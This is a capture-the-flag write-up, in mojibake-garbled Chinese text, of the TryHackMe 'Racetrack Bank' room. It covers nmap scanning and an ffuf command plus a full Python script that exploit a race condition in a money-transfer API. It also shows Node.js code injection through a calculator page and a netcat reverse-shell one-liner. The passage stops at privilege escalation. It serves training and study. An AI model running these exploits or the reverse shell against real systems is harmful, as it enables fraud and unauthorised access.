# TryHackMe:èµ›é©¬åœºé“¶è¡ŒæŠ¥é“

> åŸæ–‡ï¼š<https://infosecwriteups.com/tryhackme-racetrack-bank-writeup-879b6534b00a?source=collection_archive---------1----------------------->

æœ¬æ–‡ä»‹ç»äº†æˆ‘åœ¨ TryHackMe å¹³å°ä¸Šåˆ›å»ºçš„**èµ›é©¬åœºé“¶è¡Œ**å¤ºæ——(CTF) æŒ‘æˆ˜èµ›ã€å…è´¹æˆ¿é—´ *deltatemporal* çš„æ–¹æ³•ã€‚æˆ‘åœ¨ä¸‹é¢çš„å‚è€ƒèµ„æ–™ä¸­æä¾›äº† TryHackMe å¹³å°çš„é“¾æ¥ï¼Œä¾›æœ‰å…´è¶£å°è¯•è¿™æ¬¾ CTF çš„äººä½¿ç”¨ã€‚

![](img/c1998551bf39525542a48fa88e48a842.png)

# æ”¾å¼ƒ

æˆ‘å–œæ¬¢åœ¨ä¸€ç¯‡æ–‡ç« ä¹‹å‰æ·»åŠ ä¸€ä¸ªç®€çŸ­çš„å…è´£å£°æ˜ï¼Œä»¥é¼“åŠ±äººä»¬åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰å°è¯•ä¸€ä¸‹è¿™ä¸ªæˆ¿é—´ï¼Œå› ä¸ºåœ¨è¿™ç¯‡æ–‡ç« ä¸­æ˜¾ç„¶ä¼šæœ‰**å‰§é€****ã€‚æˆ‘ç›¸ä¿¡ï¼Œå¦‚æœä½ å…ˆè‡ªå·±å°è¯•ï¼Œç„¶ååœ¨é‡åˆ°å›°éš¾æˆ–éœ€è¦æç¤ºæ—¶å†æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œä½ ä¼šæ›´å–œæ¬¢ CTFã€‚å› æ­¤ï¼Œæ²¡æœ‰ä»»ä½•è¿›ä¸€æ­¥çš„æ‹–å»¶ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§ï¼**

# **æŒ‘æˆ˜ç®€ä»‹**

**ä»¥ä¸‹æè¿°ç”±æˆ¿é—´ä½œè€…æä¾›:**

> **ä¾µå…¥æœºå™¨å¹¶æ•è·ç”¨æˆ·å’Œæ ¹æ ‡å¿—ï¼å¾ˆéš¾ï¼Œæ‰€ä»¥ç¥ä½ å¥½è¿ã€‚**

# **åˆ—ä¸¾**

**å¥½çš„æšä¸¾æ˜¯è§£å†³è¿™ä¸ªæŒ‘æˆ˜çš„å…³é”®ï¼æˆ‘å¼€å§‹ç”¨ **NMAP** æ‰«æç›®æ ‡æœºå™¨ï¼Œå¯»æ‰¾ä»»ä½•æ‰“å¼€çš„ç«¯å£ã€‚**

```
nmap -sV -sC -v -Pn -oN nmap_report 10.10.252.171
```

**NMAP å‘½ä»¤å¯ä»¥ç»†åˆ†å¦‚ä¸‹:**

*   ****-Pn** :ç¦ç”¨ä¸»æœºå‘ç°ã€‚**
*   ****-sV** :å¯¹æœåŠ¡è¿›è¡Œç‰ˆæœ¬æ£€æµ‹ã€‚**
*   ****-sC** :ä½¿ç”¨ NMAP æä¾›çš„é»˜è®¤è„šæœ¬æ‰§è¡Œè„šæœ¬æ‰«æã€‚**
*   ****-v** :æä¾›å…³äº NMAP æ‰«æçš„è¯¦ç»†ä¿¡æ¯ã€‚**
*   ****-oN** :å°†æ‰«æç»“æœè¾“å‡ºåˆ°æ–‡ä»¶ã€‚**

**åªæœ‰ä¸¤ä¸ªç«¯å£æ‰“å¼€ï¼Œç«¯å£ 22 å’Œç«¯å£ 80ã€‚**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 51:91:53:a5:af:1a:5a:78:67:62:ae:d6:37:a0:8e:33 (RSA)
|   256 c1:70:72:cc:82:c3:f3:3e:5e:0a:6a:05:4e:f0:4c:3c (ECDSA)
|_  256 a2:ea:53:7c:e1:d7:60:bc:d3:92:08:a9:9d:20:6b:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Racetrack Bank
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**è¿›ä¸€æ­¥çš„æ‰«ææ²¡æœ‰å‘ç°ä»»ä½•å…¶ä»–å¼€æ”¾çš„ç«¯å£ã€‚**

# **Web æšä¸¾**

**æˆ‘å†³å®šæŸ¥çœ‹ç«¯å£ 80 ä¸Šæ‰˜ç®¡çš„æ˜¯ä»€ä¹ˆç½‘ç«™ï¼Œå¹¶æ‰¾åˆ°äº†ç½‘ç«™**èµ›é©¬åœºé“¶è¡Œ**çš„ç™»å½•é¡µé¢ã€‚**

**![](img/16a54739555fcfbfd34886e5374ffb42.png)**

**æˆ‘ç”¨ç”¨æˆ·åé²å‹ƒåˆ›å»ºäº†ä¸€ä¸ªè´¦æˆ·ï¼Œå¹¶ç™»å½•äº†ç½‘ç«™ã€‚åœ¨ä»ªè¡¨æ¿é¡µé¢ä¸Šï¼Œæˆ‘çœ‹åˆ°ä»¥ä¸‹æ¶ˆæ¯:**

> **æ¬¢è¿æ¥åˆ°èµ›é©¬åœºé“¶è¡Œï¼ä¸ºäº†è®©ä½ å¼€å§‹ï¼Œæˆ‘ä»¬ç»™äº†ä½  1 æšé‡‘å¸(æˆ‘ä»¬çœŸæ…·æ…¨ï¼).æ˜æ™ºåœ°ä½¿ç”¨å®ƒã€‚**

**é€šè¿‡æŸ¥çœ‹ä»ªè¡¨æ¿çš„é¡µé¢æºä»£ç ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªé“¾æ¥æŒ‡å‘ä¸€ä¸ªåä¸º*premiumfeatures.html*çš„é¡µé¢ï¼Œä½†æ˜¯æˆ‘æ— æ³•æŸ¥çœ‹è¯¥é¡µé¢çš„å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚**

```
<li class="nav-item" id="premiumlink" style="display: none">                            <a class="nav-link" href="[/premiumfeatures.html](http://10.10.191.233/premiumfeatures.html)">Premium Features</a>                        
</li>
```

**![](img/49fef911cab51a3288583bbc17bd7606.png)**

**ç„¶è€Œï¼Œè¯¥ç½‘ç«™ç¡®å®å…è®¸æ‚¨èŠ±è´¹ **10ï¼Œ000** é»„é‡‘è´­ä¹°é«˜çº§åŠŸèƒ½ã€‚**

**![](img/ede92e57c42abeb01e8959c910a1d247.png)**

**ç½‘ç«™ä¸Šæœ€åä¸€ä¸ªæœ‰è¶£çš„æ´»åŠ¨æ˜¯å°†é»„é‡‘è½¬ç§»ç»™å¦ä¸€ä¸ªç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ­£å¦‚ç™»å½•é¡µé¢ä¸Šçš„å¼€ç¯‡æ³¨é‡Šæ‰€è¯´ã€‚**

> **æ¬¢è¿æ¥åˆ°èµ›é©¬åœºé“¶è¡Œï¼Œè¿™å®¶é“¶è¡Œ(å³å°†)è®©æ‚¨**ä»¥æå¿«çš„é€Ÿåº¦è½¬è´¦**ï¼**

**![](img/c613fa6f94ab8414554c2e0f623924f6.png)**

**è¯¥ç½‘ç«™æä¾›çš„ä¸»è¦åŠŸèƒ½çš„æœ€ç»ˆåˆ—è¡¨åŒ…æ‹¬:**

1.  **åˆ›å»ºä¸€ä¸ªå¸æˆ·**
2.  **ç™»å½•é¡µé¢**
3.  **ä»ªè¡¨æ¿/ä¸»é¡µ**
4.  **è´­ä¹°é¡µé¢**
5.  **èµ é€é»„é‡‘**

**æˆ‘å†³å®šè¯•ç€æµ‹è¯•ä¸€ä¸‹æˆ‘æ˜¯å¦èƒ½æŠŠé»„é‡‘å¯„åˆ°æˆ‘ç”¨ç”¨æˆ·å *John* åˆ›å»ºçš„å¦ä¸€ä¸ªè´¦æˆ·ã€‚æˆ‘ä»¥ç”¨æˆ·*é²å‹ƒ*çš„èº«ä»½ç™»å½•ï¼Œå¹¶å°†æˆ‘çš„ 1 æšé‡‘å¸å‘ç»™äº†*çº¦ç¿°*ã€‚**

**![](img/d94725713a31cdd595e94992174c4f50.png)**

**ç„¶åï¼Œæˆ‘æ³¨é”€äº†ç”¨æˆ· *Bob çš„*è´¦æˆ·ï¼Œå¹¶ä»¥ç”¨æˆ· *John* çš„èº«ä»½ç™»å½•ã€‚æˆ‘å¯ä»¥çœ‹åˆ°è¿™å¥æ•ˆäº†ï¼Œçº¦ç¿°ç°åœ¨æœ‰äº†ä¸¤æšé‡‘ç‰Œã€‚**

**![](img/ca0a3a28966c21a3eaab955d2c533684.png)**

**æˆ‘å¯ä»¥åœ¨æŠ€æœ¯ä¸Šåˆ›å»ºæ•°åƒä¸ªå¸æˆ·ï¼Œå¹¶è½¬ç§»ä»–ä»¬çš„ 1 é‡‘ï¼Œä½†è¿™å°†éœ€è¦å¤ªé•¿çš„æ—¶é—´ï¼Œæ˜¾ç„¶ä¸æ˜¯è·å¾—ä¼˜è´¨åŠŸèƒ½çš„æ–¹å¼ã€‚**

# **æœ€åˆçš„ç«‹è¶³ç‚¹**

**åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘å¼€å§‹ä½¿ç”¨ä¸åŒçš„å·¥å…·å’ŒæŠ€æœ¯æ¥æ‰¾å‡ºæˆ‘å¯ä»¥åœ¨å“ªé‡Œè·å¾—ä¸€ä¸ªåˆæ­¥çš„ç«‹è¶³ç‚¹ã€‚è¿™å¯èƒ½æ˜¯è¿™ä¸ªæŒ‘æˆ˜ä¸­æœ€éš¾çš„éƒ¨åˆ†ï¼Œæˆ‘èŠ±äº†ä¸€æ®µæ—¶é—´æ‰å¼„æ˜ç™½ã€‚æˆ‘çš„ç¬¬ä¸€ä¸ªçº¿ç´¢æ˜¯åœ¨ä½¿ç”¨ **BurpSuite** æ‹¦æˆªå‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨çš„æµé‡æ—¶ï¼Œåœ¨ HTTP å“åº”å¤´ä¸­æ‰¾åˆ°çš„ã€‚**

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 06 Feb 2021 12:03:40 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express  #### Interesting
Cache-Control: no-store
Content-Length: 3578
```

****X-Powered-By** å‰²å°å®é™…ä¸Šä¸åšä»»ä½•äº‹æƒ…ã€‚è¿™åªæ˜¯æ„å‘³ç€ express æ­£åœ¨è¢«ä½¿ç”¨ï¼Œæœ‰ç‚¹åƒç”± php æä¾›çš„ **X-Powered å¤´ã€‚Express.js åœ¨èŠ‚ç‚¹åº”ç”¨ç¨‹åºä¸­å¤§é‡ç”¨äºå¤„ç†è·¯ç”± URLã€‚è¿™å¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¿¡æ¯æ³„éœ²ï¼Œå¯èƒ½ä¼šæ³„éœ²å¯ä»¥æ´å¯Ÿ web åº”ç”¨ç¨‹åºæ”»å‡»åª’ä»‹çš„ç»†èŠ‚ã€‚å› æ­¤ï¼Œåº”è¯¥ç¦ç”¨æ ‡é¢˜ã€‚****

**è¿™ä¸ªçº¿ç´¢æœ¬èº«åœ¨è¿™ä¸€ç‚¹ä¸Šå¹¶æ²¡æœ‰å¤ªå¤§çš„æ„ä¹‰ï¼Œä½†å®ƒå€¼å¾—è®°ä¸‹æ¥ä»¥å¤‡åç”¨ã€‚åœ¨èŠ±äº†æ›´å¤šçš„æ—¶é—´å¯»æ‰¾æœ€åˆçš„ç«‹è¶³ç‚¹åï¼Œæˆ‘å†³å®šçœ‹çœ‹ç¬¬ä¸€ä¸ªæç¤ºã€‚**

> **é“¶è¡Œçš„åå­—æš—ç¤ºäº†ä»€ä¹ˆï¼Ÿ**

**å•ç‹¬æœç´¢ **racetrack bank** å¹¶æ²¡æœ‰çœŸæ­£çš„å¸®åŠ©ï¼Œä½†æ˜¯ç»“åˆè¿™ä¸ªæç¤ºå’Œç½‘ç«™æ­£åœ¨ä½¿ç”¨ **Express Node.js æ¡†æ¶**çš„çŸ¥è¯†ï¼Œæˆ‘å†³å®šå¯»æ‰¾ä»»ä½• Node.js åŒ…ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªä¸ **racetrack å®Œå…¨åŒ¹é…çš„åŒ…ã€‚****

**![](img/020370617c1705f356840d0916543c37.png)**

**åŒ…è£…çš„æè¿°å¦‚ä¸‹:**

> **Racetrack æ˜¯ä¸€ç§ç¡®ä¿æ‰€æœ‰å¼‚æ­¥è°ƒç”¨éƒ½å®Œæˆçš„æ–¹æ³•ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªè°ƒç”¨æ²¡æœ‰å®Œæˆï¼Œå®ƒè¿˜èƒ½æ‰¾å‡ºé—®é¢˜å‡ºåœ¨å“ªé‡Œã€‚**
> 
> **å¯¹äºé‚£äº›æœ‰ä¸€å †æœ€åä¸€ä¸ªå‚æ•°éƒ½æ˜¯å‡½æ•°çš„æ–¹æ³•çš„ç±»æ¥è¯´ï¼Œè¿™æ ·åšæ˜¯å¾ˆå®¹æ˜“çš„ã€‚å¦åˆ™ï¼Œä½ å¿…é¡»åœ¨æ¯ä¸ªå‡½æ•°å‰åŠ ä¸Šä¸€ä¸ªè·Ÿè¸ªé’©å­ã€‚**
> 
> **å®ƒä»ç„¶å¾ˆåŸå§‹ã€‚**

## **ä»€ä¹ˆæ˜¯ç«äº‰æ¡ä»¶ï¼Ÿ**

**é˜…è¯»åŒ…çš„æè¿°ï¼Œçœ‹èµ·æ¥ç«äº‰æ¡ä»¶æ”»å‡»æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºåŒ…ä½¿ç”¨å¼‚æ­¥è°ƒç”¨ï¼Œä½†æ˜¯ä»€ä¹ˆæ˜¯ç«äº‰æ¡ä»¶å‘¢ï¼Ÿ**

**ç«äº‰æ¡ä»¶æ˜¯ä¸€ç§ä¸å¸Œæœ›å‡ºç°çš„æƒ…å†µï¼Œå½“è®¾å¤‡æˆ–ç³»ç»Ÿè¯•å›¾åŒæ—¶æ‰§è¡Œä¸¤ä¸ªæˆ–å¤šä¸ªæ“ä½œæ—¶ï¼Œä½†ç”±äºè®¾å¤‡æˆ–ç³»ç»Ÿçš„æ€§è´¨ï¼Œè¿™äº›æ“ä½œå¿…é¡»ä»¥æ­£ç¡®çš„é¡ºåºæ­£ç¡®å®Œæˆã€‚æˆ‘åœ¨ä¸‹é¢æä¾›äº†ä¸€äº›ä¾‹å­æ¥å¸®åŠ©æ›´å¥½åœ°ç†è§£ç«æ€æ¡ä»¶ã€‚**

****ç°å®ä¸–ç•Œçš„ä¾‹å­**:**

> **ç«äº‰æ¡ä»¶çš„ä¸€ä¸ªç®€å•ä¾‹å­æ˜¯ç”µç¯å¼€å…³ã€‚åœ¨ä¸€äº›å®¶åº­ä¸­ï¼Œæœ‰å¤šä¸ªç¯å¼€å…³è¿æ¥åˆ°ä¸€ä¸ªæ™®é€šçš„é¡¶ç¯ä¸Šã€‚å½“ä½¿ç”¨è¿™äº›ç±»å‹çš„ç”µè·¯æ—¶ï¼Œå¼€å…³ä½ç½®å˜å¾—æ— å…³ç´§è¦ã€‚å¦‚æœç¯äº®ç€ï¼Œå°†ä»»ä¸€å¼€å…³ä»å½“å‰ä½ç½®ç§»å¼€ï¼Œç¯å°±ä¼šç†„ç­ã€‚ç±»ä¼¼åœ°ï¼Œå¦‚æœç¯å…³é—­ï¼Œé‚£ä¹ˆä»å…¶å½“å‰ä½ç½®ç§»åŠ¨ä»»ä¸€å¼€å…³å°†æ‰“å¼€ç¯ã€‚è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œæƒ³è±¡ä¸€ä¸‹å¦‚æœä¸¤ä¸ªäººè¯•å›¾åŒæ—¶ç”¨ä¸¤ä¸ªä¸åŒçš„å¼€å…³æ‰“å¼€ç¯ä¼šå‘ç”Ÿä»€ä¹ˆã€‚ä¸€ä¸ªæŒ‡ä»¤å¯èƒ½ä¼šå–æ¶ˆå¦ä¸€ä¸ªæŒ‡ä»¤ï¼Œæˆ–è€…ä¸¤ä¸ªåŠ¨ä½œå¯èƒ½ä¼šä½¿æ–­è·¯å™¨è·³é—¸ã€‚**

****è®¡ç®—æœºç§‘å­¦ä¸¾ä¾‹**:**

> **ç«äº‰æ¡ä»¶é€šå¸¸ä¸è®¡ç®—æœºç§‘å­¦è”ç³»åœ¨ä¸€èµ·ã€‚åœ¨è®¡ç®—æœºå†…å­˜æˆ–å­˜å‚¨å™¨ä¸­ï¼Œå¦‚æœå‡ ä¹åœ¨åŒä¸€æ—¶åˆ»æ”¶åˆ°è¯»å†™å¤§é‡æ•°æ®çš„å‘½ä»¤ï¼Œå¹¶ä¸”æœºå™¨è¯•å›¾åœ¨ä»åœ¨è¯»å–æ—§æ•°æ®çš„åŒæ—¶è¦†ç›–æ—§æ•°æ®çš„ä¸€éƒ¨åˆ†æˆ–å…¨éƒ¨ï¼Œåˆ™å¯èƒ½å‡ºç°ç«äº‰æƒ…å†µã€‚ç»“æœå¯èƒ½æ˜¯ä»¥ä¸‹ä¸€ä¸ªæˆ–å¤šä¸ª:è®¡ç®—æœºå´©æºƒã€â€œéæ³•æ“ä½œâ€ã€ç¨‹åºçš„é€šçŸ¥å’Œå…³é—­ã€è¯»å–æ—§æ•°æ®çš„é”™è¯¯æˆ–å†™å…¥æ–°æ•°æ®çš„é”™è¯¯ã€‚å¦‚æœæŒ‡ä»¤çš„å¤„ç†é¡ºåºä¸æ­£ç¡®ï¼Œä¹Ÿä¼šå‡ºç°äº‰ç”¨æƒ…å†µã€‚**

****å®‰å…¨æ¼æ´**:**

> **å½“ä¸¤ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹å¯ä»¥è®¿é—®å…±äº«æ•°æ®ï¼Œå¹¶ä¸”å®ƒä»¬è¯•å›¾åŒæ—¶æ›´æ”¹å®ƒæ—¶ï¼Œå°±ä¼šå‘ç”Ÿäº‰ç”¨æƒ…å†µã€‚å› ä¸ºçº¿ç¨‹è°ƒåº¦ç®—æ³•å¯ä»¥éšæ—¶åœ¨çº¿ç¨‹ä¹‹é—´äº¤æ¢ï¼Œæ‰€ä»¥æ‚¨ä¸çŸ¥é“çº¿ç¨‹å°è¯•è®¿é—®å…±äº«æ•°æ®çš„é¡ºåºã€‚å› æ­¤ï¼Œæ•°æ®å˜åŒ–çš„ç»“æœå–å†³äºçº¿ç¨‹è°ƒåº¦ç®—æ³•ï¼Œå³ä¸¤ä¸ªçº¿ç¨‹éƒ½â€œç«ç›¸â€è®¿é—®/æ”¹å˜æ•°æ®ã€‚**

## **ç«äº‰æ¡ä»¶åˆ©ç”¨**

**æ—¢ç„¶æˆ‘ä»¬æœ‰äº†æ½œåœ¨çš„æ¼æ´ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾å‡ºåœ¨å“ªé‡Œä½¿ç”¨å®ƒä»¥åŠå¦‚ä½•ä½¿ç”¨å®ƒã€‚æˆ‘ä»¬çŸ¥é“ï¼Œè¦ä½¿ç”¨é«˜çº§åŠŸèƒ½ï¼Œéœ€è¦ **10ï¼Œ000** æšé‡‘å¸ã€‚æˆ‘è¿˜çŸ¥é“ï¼Œè¯¥ç½‘ç«™å…è®¸ä¸€ä¸ªç”¨æˆ·ç»™å¦ä¸€ä¸ªç”¨æˆ·é»„é‡‘ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªç§æ—æ¡ä»¶å¯ä»¥è¢«å‘ç°å’Œåˆ©ç”¨ã€‚**

**ç†è®ºä¸Šï¼Œé€šè¿‡åŒæ—¶å‘é€å¤šä¸ª POST è¯·æ±‚ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡å‘é€ä¸€ä¸ª POST è¯·æ±‚ï¼Œå¯ä»¥é€šè¿‡ç«äº‰æ¡ä»¶åˆ©ç”¨è¿™ç§åŠŸèƒ½ã€‚è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨`ffuf`æ¥åˆ©ç”¨ã€‚ç®€å•åœ°åˆ›å»ºä¸€ä¸ªé•¿åˆ—è¡¨ï¼Œåœ¨æ¯ä¸ªæ–°è¡Œä¸ŠåŒ…å«æ•°å­—`1`ï¼Œå¹¶å°†å…¶ä¼ é€’ç»™`ffuf`ï¼Œåè€…å°†ä½¿ç”¨å®ƒæ¥æ¨¡ç³Š`amount`å‚æ•°ã€‚è¿™æ˜¯å¯è¡Œçš„ï¼Œå› ä¸º`ffuf`å°†å‘é€å¤šä¸ªå¼‚æ­¥ POST è¯·æ±‚ï¼Œè€Œä¸ç­‰å¾…å“åº”ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘æ­£åœ¨è¿›è¡Œä¸€ä¸ª POST è¯·æ±‚ï¼Œä» *Bob* å‘ *John* å¤šæ¬¡å‘é€ **1** goldã€‚**

```
# Use the cookie value of the user who is sending the gold (i.e. Bob)# Provide the username of the user receiving the gold (i.e. John)ffuf -c -u [http://10.10.191.233/api/givegold](http://10.10.191.233/api/givegold) -X POST -w list.txt -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3A7CIq41Z-A_cGJJU8vStveftvTRgIrqLO.bbmGM9sKC49oAQtYUrgHSS83qC8cuu4EYw6YjDLKN7Y" -d "user=John&amount=FUZZ"
```

**æ‰§è¡Œè¯¥å‘½ä»¤åï¼Œæˆ‘ç™»å½•åˆ°ç”¨æˆ· John çš„å¸æˆ·ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æ”¶åˆ°çš„é»„é‡‘æ•°é‡è¿œè¿œå¤§äºå‘é€çš„æŒ‡å®šæ•°é‡ï¼Œè¿™è¯å®äº†ç«äº‰æ¡ä»¶æ¼æ´çš„å­˜åœ¨ã€‚**

**![](img/f47b50c1eaa023924def9ebd5d2ef61d.png)**

**æˆ‘å¯ä»¥ç»§ç»­ä½¿ç”¨è¿™ç§æ–¹æ³•å¹¶å¢åŠ å‘é€çš„æ•°é‡ï¼Œä½†æ˜¯å› ä¸ºæˆ‘å¾ˆæ‡’ï¼Œæ‰€ä»¥æˆ‘å†³å®šåˆ›å»ºä¸€ä¸ªç®€å•çš„ python è„šæœ¬æ¥è‡ªåŠ¨å®Œæˆè¿™ä¸ªè¿‡ç¨‹ğŸ˜„ã€‚**

**è¿™ä¸ªè„šæœ¬ç”¨äºå°†é»„é‡‘ä»ä¸€ä¸ªç”¨æˆ·çš„å¸æˆ·å‘é€åˆ°èµ›é“é“¶è¡Œç½‘ç«™ä¸Šçš„å¦ä¸€ä¸ªç”¨æˆ·çš„å¸æˆ·ã€‚å®ƒåˆ©ç”¨äº†ç«äº‰æ¡ä»¶æ¼æ´ï¼Œä»è€Œä¸æ˜¯ä¸€æ¬¡å‘é€ä¸€ä¸ª POST è¯·æ±‚å¹¶ç­‰å¾…å“åº”(å³åŒæ­¥)ï¼Œè€Œæ˜¯åŒæ—¶å‘é€å¤šä¸ª POST è¯·æ±‚(å¼‚æ­¥)ã€‚åœ¨å¯¹ç¬¬ä¸€ä¸ªè¯·æ±‚çš„å“åº”è¢«å‘é€å›ä¹‹å‰ï¼Œè¿™äº›è¯·æ±‚éƒ½è¢«å•ç‹¬å¤„ç†ï¼Œå¯¼è‡´å¤šä¸ªè¯·æ±‚è¢«å¤„ç†ï¼Œé»„é‡‘è¢«å‘é€ç»™ç”¨æˆ·ã€‚**

> ****è„šæœ¬ä½¿ç”¨è¯´æ˜:****
> 
> **1.ç¡®ä¿åœ¨ç½‘ç«™ä¸Šåˆ›å»ºäº†ä¸¤ä¸ªç‹¬ç«‹çš„å¸æˆ·ï¼Œå¹¶ä¸”åœ¨ä¸‹é¢çš„è„šæœ¬ä¸­æŒ‡å®šäº†å‡­æ®ã€‚**
> 
> **2.ç¡®ä¿ä¸¤ä¸ªç”¨æˆ·çš„å¸æˆ·ä¸­è‡³å°‘æœ‰ä¸€æšé‡‘ç‰Œã€‚**
> 
> **æ³¨æ„:ç¡®ä¿ IP åœ°å€è®¾ç½®æ­£ç¡®ã€‚æ­¤å¤–ï¼Œæ¯æ¬¡ç”¨æˆ·ç™»å½•æˆ–é€€å‡ºæ—¶ï¼Œcookie éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™ç”±ä¸‹é¢çš„è„šæœ¬å¤„ç†ã€‚**

**è¿™ä¸ªè„šæœ¬å¯èƒ½éœ€è¦å‡ åˆ†é’Ÿçš„æ—¶é—´æ¥è¿è¡Œï¼Œä½†æœ€ç»ˆä¼šç»™æˆ‘ä»¬æä¾›è´­ä¹°é«˜çº§åŠŸèƒ½æ‰€éœ€çš„é»„é‡‘ã€‚**

```
#!/usr/bin/env pythonimport grequests
import requests
from bs4 import BeautifulSoup# Websites IP Address for your room.
ip_address = "10.10.133.7"# Credentials for First Account created.
user_1 = "John"
pass_1 = "password"# Credentials for Second Account created.
user_2 = "Bob"
pass_2 = "password"# Retrieve users cookie and current amount of gold.
def userGoldAndCookie(username, password):
 # Details to be posted to the login form.
 payload = {
 'username': username,
 'password': password
 }
    # Retrieve Gold Amount and Cookie for the specified user.
 with requests.Session() as s:
  # Login as the specified user.
  p = s.post('[http://{}/api/login'.format(ip_address),](http://{}/api/login'.format(ip_address),) data=payload)
  # Get the amount of gold for the specified user.
  gold_amount = 0
  soup = BeautifulSoup(p.text, "html.parser")
  for tag in soup.find_all('a'):
   if "Gold:" in tag.text:
    gold_amount = int(str(tag.text).split(":", 1)[1].strip())
    print("Current Gold Amount for User {}: {}".format(username, gold_amount))# Get the new cookie generated for the user.
  cookie_dict = s.cookies.get_dict()
  return cookie_dict['connect.sid'], gold_amount# Function is used to send gold to a user.
def sendGold(user, cookie, amount):
 print("Sending {} gold to user {}".format(amount, user))
 # Websites URL used to give gold to another user.
 url = '[http://{}/api/givegold'.format(ip_address)](http://{}/api/givegold'.format(ip_address))# Network POST Request Headers
 headers = {
 "Host" : "{}".format(ip_address),
 "Referer" : "[http://{}/giving.html](http://{}/giving.html)".format(ip_address),
 "Content-Type" : "application/x-www-form-urlencoded",
 "Connection" : "close",
 "Cookie" : "connect.sid={}".format(cookie),
 "Upgrade-Insecure-Requests" : "1"
 }

    # The cookie of the user sending the gold
 cookies = {
 "connect.sid" : cookie
 }# N.B. Need to use data instead of params for a POST Request
 # This will send multiple POST requests, giving John 1000 gold in each POST request.
 data = "user={}&amount={}".format(user,amount)# Send asynchronous post requests
 rs = (grequests.post(url, data=data, cookies=cookies, headers=headers) for i in range(0,100))
 requests = grequests.map(rs)
 print("{} gold has been sent to user {}!".format(amount, user))gold_needed = 0
counter = 1while gold_needed < 10000:
 if counter % 2 == 0:
  print("{} turn to send gold...".format(user_1))
  values = userGoldAndCookie(user_1, pass_1)
  gold_needed = values[1]
  sendGold(user_2, values[0], values[1])
  counter += 1
 else:
  print("{} turn to send gold...".format(user_2))
  values = userGoldAndCookie(user_2, pass_2)
  gold_needed = values[1]
  sendGold(user_1, values[0], values[1])
  counter += 1
```

**è¿è¡Œè¿™ä¸ªè„šæœ¬åï¼Œæˆ‘ç»ˆäºè·å¾—äº†è¶³å¤Ÿçš„é‡‘å¸æ¥è´­ä¹°é«˜çº§åŠŸèƒ½ã€‚**

```
John turn to send gold...
Current Gold Amount for User John: 16000
Sending 16000 gold to user Bob
16000 gold has been sent to user Bob!
Success!! We have all the gold we need ;)
```

## **Node.js è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)**

**è´­ä¹°é«˜çº§åŠŸèƒ½åï¼Œæˆ‘å¯ä»¥è®¿é—®ä¸€ä¸ªæ˜¾ç¤ºä»¥ä¸‹æ¶ˆæ¯çš„æ–°é¡µé¢ã€‚**

> **è¿™æ˜¯æˆ‘ä»¬æƒŠäººçš„é«˜çº§åŠŸèƒ½:ä¸€ä¸ªè®¡ç®—å™¨ï¼è¿™ä¹ˆæœ‰ç”¨ï¼**
> 
> **è¾“å…¥è®¡ç®—ï¼Œä¾‹å¦‚ 1+1ï¼Œå®ƒä¼šå‘Šè¯‰ä½ ç­”æ¡ˆï¼**
> 
> **è®¡ç®—**

**å› ä¸ºæˆ‘å·²ç»çŸ¥é“ Node.js æ­£åœ¨è¢«ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘å°è¯•ä½¿ç”¨ Node.js ç¼–ç¨‹è¯­è¨€æ¥æ‰§è¡Œ RCE:**

```
process.cwd()
```

**è¿™æ˜¯å¯è¡Œçš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»£ç ã€‚**

**![](img/28fe86b22733f6be17fe88c3e886e078.png)**

**æˆ‘ä½¿ç”¨ä¸‹é¢çš„ Node.js ä»£ç åˆ›å»ºäº†ä¸€ä¸ªåå‘ shell:**

```
require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_ADDRESS 4444 >/tmp/f')
```

**ä¸€æ—¦æˆ‘è·å¾—äº†ä¸€ä¸ªåå‘å¤–å£³ï¼Œæˆ‘å°±å¯ä»¥å¾—åˆ°ç”¨æˆ·çš„æ ‡å¿—ğŸ˜ƒï¼**

**![](img/cd1e159fe470e6fc6d83e01cfb2bce65.png)**

# **æ ¹æƒé™æå‡**

**æˆ‘å¼€å§‹å¯»æ‰¾å°†æˆ‘çš„æƒé™æå‡åˆ° root çš„æ–¹æ³•ã€‚åœ¨æšä¸¾æœºå™¨æ—¶ï¼Œæˆ‘å‘ç°æœ‰ä¸€ä¸ª cronjob æ­£åœ¨ä½¿ç”¨å·¥å…· **pspy32** è¿è¡Œæ¸…ç†è„šæœ¬ã€‚**

**![](img/9459f9cdfaca60f3bd059553136adf84.png)**

